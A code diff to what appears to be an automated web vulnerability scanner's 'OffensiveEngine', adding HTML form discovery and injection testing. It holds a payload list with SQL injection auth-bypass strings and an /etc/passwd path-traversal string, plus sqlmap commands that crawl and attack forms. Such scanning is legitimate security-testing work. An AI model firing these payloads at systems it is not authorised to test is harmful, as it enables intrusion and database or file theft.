@@ -17,7 +17,8 @@ import json
 import os
 import re
 import tempfile
-from urllib.parse import urlparse, parse_qs
+from html.parser import HTMLParser
+from urllib.parse import urlparse, parse_qs, urljoin
 
 # Curated wordlists first (fast, fetched at build time), full SecLists as fallback.
 SECLISTS_DIRS = [
@@ -55,6 +56,54 @@ SPEC_PATHS = [
     "/swagger/v1/swagger.json", "/api/swagger.json", "/api-docs/swagger.json",
     "/openapi.yaml", "/api/openapi.json",
 ]
+
+# Unlikely-to-collide reflection canary + the shared injection payload set used by
+# both the query-param auto-fuzz and the form (POST/body) probe.
+XSS_CANARY = "olymxss7z"
+INJECT_PAYLOADS = [
+    "'", '"', "')", "';",              # SQL / quote syntax breakers
+    "1' OR '1'='1", "' OR 1=1-- -",    # SQLi (incl. auth-bypass on login forms)
+    f"<{XSS_CANARY}>",                  # unencoded-reflection canary
+    "../../../../etc/passwd",          # path traversal
+]
+
+
+class _FormExtractor(HTMLParser):
+    """Pull <form> actions/methods and their input/textarea/select field names out
+    of an HTML page — the POST/body attack surface a URL crawler never sees."""
+
+    def __init__(self):
+        super().__init__()
+        self.forms = []
+        self._cur = None
+
+    def handle_starttag(self, tag, attrs):
+        a = dict(attrs)
+        if tag == "form":
+            self._cur = {"action": a.get("action") or "",
+                         "method": (a.get("method") or "get").lower(),
+                         "fields": []}
+        elif tag in ("input", "textarea", "select") and self._cur is not None:
+            name = a.get("name")
+            itype = (a.get("type") or "text").lower()
+            if name and itype not in ("submit", "button", "image", "reset", "file", "hidden"):
+                if name not in self._cur["fields"]:
+                    self._cur["fields"].append(name)
+
+    def handle_endtag(self, tag):
+        if tag == "form" and self._cur is not None:
+            self.forms.append(self._cur)
+            self._cur = None
+
+
+def _host_ok(candidate: str, base: str) -> bool:
+    """True when candidate is on the same host as base — keeps form testing in scope."""
+    try:
+        ch = urlparse(candidate).netloc.lower()
+        bh = urlparse(base).netloc.lower()
+        return bool(ch) and ch == bh
+    except Exception:
+        return False
 
 # Static assets to drop from archive parameter discovery: they rarely carry an
 # injectable parameter and would only dilute the test pool.
@@ -259,70 +308,89 @@ class OffensiveEngine:
         return out
 
     # ── SQL injection ────────────────────────────────────────────
-    async def test_sqli(self, urls: list) -> list:
-        param_urls = [u for u in urls if "?" in u and "=" in u][:25]
-        if not param_urls:
-            await self.log("No parameterized URLs to test for SQLi", "info")
-            return []
-
-        await self.log(f"Testing {len(param_urls)} endpoints for SQL injection (sqlmap)", "info")
-        findings = []
-
-        with tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False) as f:
-            f.write("\n".join(param_urls))
-            url_file = f.name
-
-        try:
-            sqlmap_cmd = ["sqlmap", "-m", url_file, "--batch", "--random-agent",
-                          "--level", "2", "--risk", "2", "--smart",
-                          "--technique", "BEUST", "--threads", "4",
-                          "--timeout", "15", "--retries", "1",
-                          "--output-dir", "/tmp/sqlmap_out"]
-            if self._cookie():
-                sqlmap_cmd += ["--cookie", self._cookie()]
-            stdout, stderr, rc = await self.run_command(sqlmap_cmd, timeout=600)
-            if rc == 127:
-                await self.log("sqlmap not available; SQLi testing skipped", "warn")
-                return []
-
-            combined = stdout + stderr
-            # sqlmap prints "Parameter: X (GET)" and "Type:" blocks on a hit
-            vuln_blocks = re.findall(
-                r"Parameter:\s*(.+?)\s*\((\w+)\).*?Type:\s*(.+?)\n.*?Title:\s*(.+?)\n",
-                combined, re.DOTALL,
+    async def _emit_sqlmap_hits(self, combined: str, tag: str = "") -> list:
+        """Parse sqlmap output for confirmed injection points and raise a finding
+        for each. Shared by the GET-parameter and form passes."""
+        found = []
+        vuln_blocks = re.findall(
+            r"Parameter:\s*(.+?)\s*\((\w+)\).*?Type:\s*(.+?)\n.*?Title:\s*(.+?)\n",
+            combined, re.DOTALL,
+        )
+        for param, method, sqli_type, title in vuln_blocks:
+            found.append({"parameter": param.strip(), "method": method, "type": sqli_type.strip()})
+            await self.add_finding(
+                title=f"SQL Injection: {param.strip()} ({method}){tag}",
+                severity="critical",
+                description=f"SQL injection confirmed by sqlmap on parameter '{param.strip()}'. "
+                            f"Injection type: {sqli_type.strip()}. An attacker can read or modify "
+                            f"the database, extract credentials, and potentially achieve RCE.",
+                evidence=f"sqlmap: {title.strip()}\nParameter: {param.strip()} ({method})",
+                cvss_score=9.8,
+                remediation="Use parameterized queries / prepared statements. Never concatenate "
+                            "user input into SQL. Apply least-privilege DB accounts and a WAF.",
             )
-            hit_urls = re.findall(r"sqlmap identified the following injection point.*?URL:\s*(\S+)", combined, re.DOTALL)
+        return found
 
-            for param, method, sqli_type, title in vuln_blocks:
-                findings.append({"parameter": param.strip(), "method": method, "type": sqli_type.strip()})
-                await self.add_finding(
-                    title=f"SQL Injection: {param.strip()} parameter ({method})",
-                    severity="critical",
-                    description=f"SQL injection confirmed by sqlmap on parameter '{param.strip()}'. "
-                                f"Injection type: {sqli_type.strip()}. An attacker can read or modify "
-                                f"the database, extract credentials, and potentially achieve RCE.",
-                    evidence=f"sqlmap: {title.strip()}\nParameter: {param.strip()} ({method})",
-                    cvss_score=9.8,
-                    remediation="Use parameterized queries / prepared statements. Never concatenate "
-                                "user input into SQL. Apply least-privilege DB accounts and a WAF.",
-                )
+    async def test_sqli(self, base_url: str, urls: list) -> list:
+        findings = []
+        param_urls = [u for u in urls if "?" in u and "=" in u][:25]
 
-            if not vuln_blocks and "is vulnerable" in combined.lower():
-                await self.add_finding(
-                    title="Possible SQL Injection (manual confirm)",
-                    severity="high",
-                    description="sqlmap flagged a potential injection point. Manual confirmation advised.",
-                    evidence=combined[-400:],
-                    cvss_score=7.5,
-                    remediation="Parameterize queries; review flagged endpoint.",
-                )
+        # (1) GET-parameter SQLi
+        if param_urls:
+            await self.log(f"Testing {len(param_urls)} endpoints for SQL injection (sqlmap)", "info")
+            with tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False) as f:
+                f.write("\n".join(param_urls))
+                url_file = f.name
+            try:
+                sqlmap_cmd = ["sqlmap", "-m", url_file, "--batch", "--random-agent",
+                              "--level", "2", "--risk", "2", "--smart",
+                              "--technique", "BEUST", "--threads", "4",
+                              "--timeout", "15", "--retries", "1",
+                              "--output-dir", "/tmp/sqlmap_out"]
+                if self._cookie():
+                    sqlmap_cmd += ["--cookie", self._cookie()]
+                stdout, stderr, rc = await self.run_command(sqlmap_cmd, timeout=600)
+                if rc == 127:
+                    await self.log("sqlmap not available; SQLi testing skipped", "warn")
+                    return findings
+                combined = stdout + stderr
+                findings += await self._emit_sqlmap_hits(combined)
+                if not findings and "is vulnerable" in combined.lower():
+                    await self.add_finding(
+                        title="Possible SQL Injection (manual confirm)",
+                        severity="high",
+                        description="sqlmap flagged a potential injection point. Manual confirmation advised.",
+                        evidence=combined[-400:],
+                        cvss_score=7.5,
+                        remediation="Parameterize queries; review flagged endpoint.",
+                    )
+            except Exception as e:
+                await self.log(f"sqlmap error: {e}", "warn")
+            finally:
+                os.unlink(url_file)
+        else:
+            await self.log("No parameterized URLs to test for SQLi — trying forms", "info")
 
-            await self.log(f"SQLi testing complete: {len(vuln_blocks)} confirmed injection points", "success" if vuln_blocks else "info")
-        except Exception as e:
-            await self.log(f"sqlmap error: {e}", "warn")
-        finally:
-            os.unlink(url_file)
+        # (2) Form-based SQLi: sqlmap discovers and tests the POST/GET forms it finds
+        # (login, search, checkout). This is where auth-bypass SQLi actually lives.
+        if base_url:
+            await self.log("Testing forms for SQL injection (sqlmap --forms)", "info")
+            try:
+                forms_cmd = ["sqlmap", "-u", base_url, "--forms", "--crawl=1", "--batch",
+                             "--random-agent", "--level", "2", "--risk", "2", "--smart",
+                             "--technique", "BEUST", "--threads", "4", "--timeout", "15",
+                             "--retries", "1", "--crawl-exclude", "logout|logoff|signout",
+                             "--output-dir", "/tmp/sqlmap_out"]
+                if self._cookie():
+                    forms_cmd += ["--cookie", self._cookie()]
+                fstdout, fstderr, frc = await self.run_command(forms_cmd, timeout=600)
+                if frc != 127:
+                    findings += await self._emit_sqlmap_hits(fstdout + fstderr, " [form]")
+            except Exception as e:
+                await self.log(f"sqlmap forms error: {e}", "warn")
 
+        await self.log(f"SQLi testing complete: {len(findings)} injection point(s)",
+                       "success" if findings else "info")
         return findings
 
     # ── XSS ──────────────────────────────────────────────────────
@@ -708,60 +776,146 @@ class OffensiveEngine:
                             break
         return findings
 
+    # ── Shared injection detector ────────────────────────────────
+    def _injection_verdict(self, pl, r):
+        """Classify one response to a crafted payload. Shared by the query-param
+        auto-fuzz and the form probe. Returns a finding dict or None."""
+        from core.replay import ERROR_SIGNATURES
+        try:
+            body = r.text or ""
+        except Exception:
+            body = ""
+        low = body.lower()
+        errs = [s for s in ERROR_SIGNATURES if s in low]
+        if errs:
+            return {
+                "title": "Parameter Injection Signal (server error)",
+                "severity": "medium", "cvss": 5.3,
+                "description": ("A crafted value triggered a server-side error signature "
+                                f"('{errs[0]}'), indicating the input is not safely handled "
+                                "(possible SQL/command injection). Confirm with the workbench."),
+                "evidence": f"Error signature: {errs[0]} | HTTP {r.status_code}",
+                "remediation": "Use parameterized queries / safe APIs and validate input.",
+            }
+        if XSS_CANARY in pl and f"<{XSS_CANARY}>" in body:
+            return {
+                "title": "Reflected Input (possible reflected XSS)",
+                "severity": "low", "cvss": 4.0,
+                "description": ("The value is reflected unencoded in the response — the prerequisite "
+                                "for reflected XSS. Confirm the injection context."),
+                "evidence": f"Canary reflected unencoded | HTTP {r.status_code}",
+                "remediation": "Context-encode all output; apply a strict CSP.",
+            }
+        if "etc/passwd" in pl and "root:x:0:0" in body:
+            return {
+                "title": "Path Traversal (arbitrary file read)",
+                "severity": "high", "cvss": 7.5,
+                "description": "The input allowed reading /etc/passwd via directory traversal.",
+                "evidence": "Response contains /etc/passwd contents (root:x:0:0:)",
+                "remediation": "Never build file paths from user input; use an allowlist / canonicalize.",
+            }
+        return None
+
     # ── Auto-fuzz: fast deterministic injection-signal sweep ─────
     async def auto_fuzz(self, urls: list) -> list:
-        """Fire a small curated payload set at every parameter and flag error
-        signatures, unencoded reflection, and file-read markers.
+        """Fire the injection payload set at every query parameter, flagging error
+        signatures, unencoded reflection, and file-read markers. Reuses _param_probe."""
+        return await self._param_probe(urls, INJECT_PAYLOADS, self._injection_verdict,
+                                       cap=25, per_params=4)
 
-        Turns the discovered/seeded surface into findings without a binary, and
-        catches signals sqlmap/dalfox miss or that show up when those tools are
-        absent. Reuses _param_probe (per-param mutation + evidence capture)."""
-        from core.replay import ERROR_SIGNATURES
+    # ── Form discovery + POST/body injection ─────────────────────
+    async def discover_forms(self, urls: list, cap_pages: int = 25) -> list:
+        """Fetch crawled pages, parse their <form>s, and return testable specs
+        {method, url, fields}. This is the POST/body attack surface — logins,
+        searches, checkout — that a URL-only crawler never exposes."""
+        import httpx
+        specs, seen = [], set()
+        pages = list(dict.fromkeys(urls))[:cap_pages]
+        if not pages:
+            return specs
+        try:
+            async with httpx.AsyncClient(timeout=8, verify=False, follow_redirects=True,
+                                         headers=self._auth_headers()) as c:
+                for page in pages:
+                    try:
+                        r = await c.get(page)
+                    except Exception:
+                        continue
+                    if "html" not in r.headers.get("content-type", "").lower():
+                        continue
+                    ex = _FormExtractor()
+                    try:
+                        ex.feed(r.text or "")
+                    except Exception:
+                        continue
+                    for form in ex.forms:
+                        if not form["fields"]:
+                            continue
+                        action_url = urljoin(page, form["action"]) if form["action"] else page
+                        if not _host_ok(action_url, page):   # stay on the crawled host
+                            continue
+                        key = (form["method"], action_url, tuple(sorted(form["fields"])))
+                        if key in seen:
+                            continue
+                        seen.add(key)
+                        specs.append({"method": form["method"].upper(), "url": action_url,
+                                      "fields": form["fields"]})
+        except Exception as e:
+            await self.log(f"Form discovery skipped: {e}", "warn")
+        if specs:
+            await self.log(f"Form discovery: {len(specs)} testable form(s) "
+                           f"({sum(1 for s in specs if s['method'] == 'POST')} POST)", "info")
+        return specs
 
-        payloads = [
-            "'", '"', "')", "';",              # SQL/quote syntax breakers
-            "1' OR '1'='1", "' OR 1=1-- -",    # SQLi
-            "<olymxss>",                        # unencoded-reflection canary
-            "../../../../etc/passwd",          # path traversal
-        ]
-
-        def detect(pl, r):
-            try:
-                body = r.text or ""
-            except Exception:
-                body = ""
-            low = body.lower()
-            errs = [s for s in ERROR_SIGNATURES if s in low]
-            if errs:
-                return {
-                    "title": "Parameter Injection Signal (server error)",
-                    "severity": "medium", "cvss": 5.3,
-                    "description": ("A crafted value triggered a server-side error signature "
-                                    f"('{errs[0]}'), indicating the parameter is not safely handled "
-                                    "(possible SQL/command injection). Confirm with the workbench."),
-                    "evidence": f"Error signature: {errs[0]} | HTTP {r.status_code}",
-                    "remediation": "Use parameterized queries / safe APIs and validate input.",
-                }
-            if pl == "<olymxss>" and "<olymxss>" in body:
-                return {
-                    "title": "Reflected Input (possible reflected XSS)",
-                    "severity": "low", "cvss": 4.0,
-                    "description": ("The parameter value is reflected unencoded in the response — "
-                                    "the prerequisite for reflected XSS. Confirm the injection context."),
-                    "evidence": f"Canary '<olymxss>' reflected unencoded | HTTP {r.status_code}",
-                    "remediation": "Context-encode all output; apply a strict CSP.",
-                }
-            if "etc/passwd" in pl and "root:x:0:0" in body:
-                return {
-                    "title": "Path Traversal (arbitrary file read)",
-                    "severity": "high", "cvss": 7.5,
-                    "description": "The parameter allowed reading /etc/passwd via directory traversal.",
-                    "evidence": "Response contains /etc/passwd contents (root:x:0:0:)",
-                    "remediation": "Never build file paths from user input; use an allowlist / canonicalize.",
-                }
-            return None
-
-        return await self._param_probe(urls, payloads, detect, cap=25, per_params=4)
+    async def test_forms(self, form_specs: list) -> list:
+        """Inject the payload set into each form field (POST or GET) and flag the
+        same signals as auto_fuzz — this is where login-form SQLi and search XSS
+        surface. Findings + the proving request are captured as evidence."""
+        import httpx
+        findings, seen = [], set()
+        specs = (form_specs or [])[:20]
+        if not specs:
+            return findings
+        try:
+            async with httpx.AsyncClient(timeout=8, verify=False, follow_redirects=True,
+                                         headers=self._auth_headers()) as c:
+                for spec in specs:
+                    method, url, fields = spec["method"], spec["url"], spec["fields"]
+                    for field in fields[:8]:
+                        key = (method, url, field)
+                        if key in seen:
+                            continue
+                        seen.add(key)
+                        for pl in INJECT_PAYLOADS:
+                            data = {f: (pl if f == field else "test") for f in fields}
+                            try:
+                                if method == "POST":
+                                    r = await c.post(url, data=data)
+                                else:
+                                    r = await c.get(url, params=data)
+                            except Exception:
+                                continue
+                            verdict = self._injection_verdict(pl, r)
+                            if verdict:
+                                _f = await self.add_finding(
+                                    title=f"{verdict['title']}: {field} (form {method})",
+                                    severity=verdict["severity"],
+                                    description=verdict["description"],
+                                    evidence=(f"Form: {method} {url}\nField: {field}\nPayload: {pl}\n"
+                                              f"{verdict.get('evidence', '')}"),
+                                    cvss_score=verdict["cvss"],
+                                    remediation=verdict["remediation"],
+                                )
+                                await self.capture(
+                                    r, finding_id=(_f.id if _f else None),
+                                    notes=f"{verdict['title']} on form field '{field}' ({method} {url})")
+                                findings.append({"field": field, "url": url, "method": method, "payload": pl})
+                                break
+        except Exception as e:
+            await self.log(f"Form testing error: {e}", "warn")
+        if findings:
+            await self.log(f"Form testing: {len(findings)} injection signal(s) on form fields", "success")
+        return findings
 
     # ── SSRF (in-band: cloud metadata / file read) ───────────────
     async def test_ssrf(self, urls: list) -> list:
@@ -1159,10 +1313,14 @@ class OffensiveEngine:
             f"Attack surface: {len(urls)} unique endpoints ({params} parameterized) "
             f"from crawl + archives + param mining + API/SPA seeding + specs", "info")
 
+        # Form/POST attack surface (logins, searches, checkout) — the inputs a
+        # URL crawler never exposes, and where auth-bypass SQLi / stored XSS live.
+        forms = await self.discover_forms([base_url] + urls)
+
         # Run injection / access-control classes concurrently where safe.
         (sqli, xss, dast, auth, trav, disco,
-         ssrf, ssti, oredir, cors, hosthdr, fuzz) = await asyncio.gather(
-            self.test_sqli(urls),
+         ssrf, ssti, oredir, cors, hosthdr, fuzz, formhits) = await asyncio.gather(
+            self.test_sqli(base_url, urls),
             self.test_xss(urls),
             self.nuclei_dast(urls),
             self.test_auth(base_url, urls),
@@ -1174,6 +1332,7 @@ class OffensiveEngine:
             self.test_cors(base_url, urls),
             self.test_host_header(base_url),
             self.auto_fuzz(urls),
+            self.test_forms(forms),
             return_exceptions=True,
         )
 
@@ -1200,8 +1359,9 @@ class OffensiveEngine:
             "cors": _safe(cors),
             "host_header": _safe(hosthdr),
             "fuzz": _safe(fuzz),
+            "forms": _safe(formhits),
         }
         total = sum(len(_safe(v)) for v in
-                    (sqli, xss, dast, auth, trav, zap, ssrf, ssti, oredir, cors, hosthdr, fuzz))
+                    (sqli, xss, dast, auth, trav, zap, ssrf, ssti, oredir, cors, hosthdr, fuzz, formhits))
         await self.log(f"⚔ Offensive engine complete: {total} injection/access/DAST findings across {len(urls)} URLs", "success")
         return result
